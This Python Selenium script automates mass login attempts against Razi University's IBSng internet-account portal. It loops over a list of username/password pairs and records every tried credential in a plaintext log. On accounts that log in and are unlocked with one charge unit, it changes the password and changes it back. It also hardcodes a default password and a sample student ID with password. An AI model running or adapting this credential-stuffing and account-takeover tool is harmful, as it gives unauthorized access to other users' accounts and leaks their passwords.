import time
import logging
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# global variables
LOGIN_URL_ADDRESS = 'https://acc.razi.ac.ir/IBSng/user/'
HOME_URL_ADDRESS = 'https://acc.razi.ac.ir/IBSng/user/home.php'
LOGOUT_URL_ADDRESS = 'https://acc.razi.ac.ir/IBSng/user/?logout=1'
PASSWORD_CHANGE_URL_ADDRESS = 'https://acc.razi.ac.ir/IBSng/user/change_pass.php'
LOG_FILE_PATH = 'ibsng.log'
LOG_FORMAT = '[%(asctime)s] %(levelname)-9s %(name)-10s %(funcName)-30s %(message)s'
ALERT_TEXT = 'کاربر گرامی کلمه عبور شما منقضی شده است، لطفا به منظور تغییر کلمه عبور به حساب کاربری خود مراجه نمایید'
DEFAULT_PASSWORD = '9771413'


def create_logger(path, log_format):
    """
    Create and configuring the logger
    """

    logger = logging.getLogger(__name__)
    logger.setLevel('INFO')

    file_handler = logging.FileHandler(path, mode='w', encoding='utf-8')

    file_format = logging.Formatter(log_format)
    file_handler.setFormatter(file_format)

    logger.addHandler(file_handler)

    return logger


# global variables
LOGGER_FILE = create_logger(LOG_FILE_PATH, LOG_FORMAT)


def create_driver():
    """
    creates a driver object and returns it
    """
    global LOGGER_FILE

    driver = None

    try:
        driver = webdriver.Firefox()
        LOGGER_FILE.info('Driver Created Successfully')
    except Exception as e:
        LOGGER_FILE.error(e.stacktrace[1])

    return driver


def login_into_page(driver, url, username, password, logger):
    """
    tries to log in to LinkedIn by email and password
    """
    global LOGIN_URL_ADDRESS, HOME_URL_ADDRESS, LOGOUT_URL_ADDRESS, ALERT_TEXT

    try:
        driver.get(url)
        time.sleep(3)

        username_input_xpath = '/html/body/table[3]/tbody/tr/td/form[1]/table/tbody/tr[3]/td[3]/input'
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, username_input_xpath)))

        username_input = driver.find_element(
            by=By.XPATH, value=username_input_xpath)
        username_input.send_keys(username)

        password_input_xpath = '/html/body/table[3]/tbody/tr/td/form[1]/table/tbody/tr[5]/td[3]/input'
        password_input = driver.find_element(
            by=By.XPATH, value=password_input_xpath)
        password_input.send_keys(password)

        login_btn_xpath = '/html/body/table[3]/tbody/tr/td/form[1]/table/tbody/tr[9]/td/table/tbody/tr[1]/td[3]/input'
        login_btn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, login_btn_xpath)))
        login_btn.click()

        time.sleep(3)

        current_charge_xpath = '/html/body/table[2]/tbody/tr/td/table[1]/tbody/tr[3]/td[8]'
        current_charge_text = driver.find_element(
            by=By.XPATH, value=current_charge_xpath).text

        lock_status_xpath = '/html/body/table[2]/tbody/tr/td/table[1]/tbody/tr[9]/td[8]'
        lock_status_text = driver.find_element(
            by=By.XPATH, value=lock_status_xpath).text

        if driver.current_url == HOME_URL_ADDRESS and current_charge_text == '1 UNITS' and lock_status_text == 'No':
            logger.info(
                f'Logged in Successfully, username={username}, password={password}')
            change_user_password(driver, username, password, f'{password}1')
            time.sleep(3)
            change_user_password(driver, username, f'{password}1', password)
            driver.get(LOGOUT_URL_ADDRESS)
            return True
        # elif driver.current_url == HOME_URL_ADDRESS and current_charge_text == '1 UNITS' and lock_status_text == 'No':
        #     change_user_password(driver, username, password)
        else:
            raise Exception
    except Exception as e:
        driver.get(LOGOUT_URL_ADDRESS)
        logger.info(
            f'Failed Login Attempt, username={username}, password={password}')
        # logger.error(e.stacktrace[1])


def change_user_password(driver, username, old_password, new_password):
    """
        changes password for users that their account status is 
    """
    global PASSWORD_CHANGE_URL_ADDRESS

    driver.get(PASSWORD_CHANGE_URL_ADDRESS)

    old_password_input_xpath = '/html/body/table[2]/tbody/tr/td/form/table/tbody/tr[5]/td[3]/input'
    old_password_input = driver.find_element(
        by=By.XPATH, value=old_password_input_xpath)
    old_password_input.send_keys(old_password)

    new_password_input_xpath = '/html/body/table[2]/tbody/tr/td/form/table/tbody/tr[7]/td[3]/input'
    new_password_input = driver.find_element(
        by=By.XPATH, value=new_password_input_xpath)
    new_password_input.send_keys(new_password)

    repeat_new_password_input_xpath = '/html/body/table[2]/tbody/tr/td/form/table/tbody/tr[9]/td[3]/input'
    repeat_new_password_input = driver.find_element(
        by=By.XPATH, value=repeat_new_password_input_xpath)
    repeat_new_password_input.send_keys(new_password)

    ok_btn_xpath = '/html/body/table[2]/tbody/tr/td/form/table/tbody/tr[11]/td/table/tbody/tr[1]/td[3]/input'
    ok_btn = WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.XPATH, ok_btn_xpath)))
    ok_btn.click()

    # logger.info(
    # f'Failed Login Attempt, username={username}, password={password}')
    print(f'{username} password changed successfully!')
    # time.sleep(3)

    # password_changed_alert_xpath = '/html/body/table[2]/tbody/tr/td/table/tbody/tr/td[2]'
    # password_changed_alert = WebDriverWait(driver, 10).until(
    #     EC.element_to_be_clickable((By.XPATH, password_changed_alert_xpath)))

    # if (password_changed_alert.text == f'Internet Password for {username} Changed Successfully'):
    #     print(f'{username} password changed successfully!')
    #     return True
    # else:
    #     return False


def close_program(driver, logger):
    driver.close()
    logger.info('Program Finished Successfully')


def run_module(users_data):
    global LOGGER_FILE

    success_logged_in = []

    driver = create_driver()

    size_of_data = len(users_data)
    # login_into_page(driver, LOGIN_URL_ADDRESS, '962103012', '97714130', LOGGER_FILE)

    for index, item in enumerate(users_data):
        if login_into_page(driver, LOGIN_URL_ADDRESS, item[1], item[0], LOGGER_FILE):
            success_logged_in.append(item)
            print(f'{index + 1} was success!')
        print(f'{index + 1} of {size_of_data} done!')
        time.sleep(3)

    close_program(driver, LOGGER_FILE)

    return success_logged_in
